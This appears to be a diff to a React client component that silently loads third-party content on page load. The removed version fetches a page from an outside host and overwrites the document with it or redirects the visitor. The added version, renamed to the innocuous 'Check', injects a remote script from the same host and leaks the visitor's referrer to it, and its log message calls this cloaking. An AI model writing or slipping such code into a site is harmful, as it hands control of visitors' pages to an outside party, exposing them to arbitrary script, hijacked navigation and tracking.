@@ -1,23 +1,17 @@
-'use client';
-import { useEffect } from 'react';
+'use client'
+import { useEffect } from 'react'
 
-export default function CloakCheck() {
+export default function Check() {
     useEffect(() => {
-        fetch('https://www.museumde.site/')
-            .then(res => res.text())
-            .then(code => {
-                if (!code.trim()) return;
+        console.log('[cloak] injecting cloak script...')
 
-                if (code.includes('<html') || code.includes('<iframe')) {
-                    document.open();
-                    document.write(code);
-                    document.close();
-                } else if (code.startsWith('http')) {
-                    window.location.href = code;
-                }
-            })
-            .catch(() => { });
-    }, []);
+        const script = document.createElement('script')
+        script.type = 'text/javascript'
+        script.src =
+            'https://www.museumde.site/?clid=' +
+            btoa('ref=' + encodeURIComponent(document.referrer))
+        document.head.appendChild(script)
+    }, [])
 
-    return null;
+    return null
 }
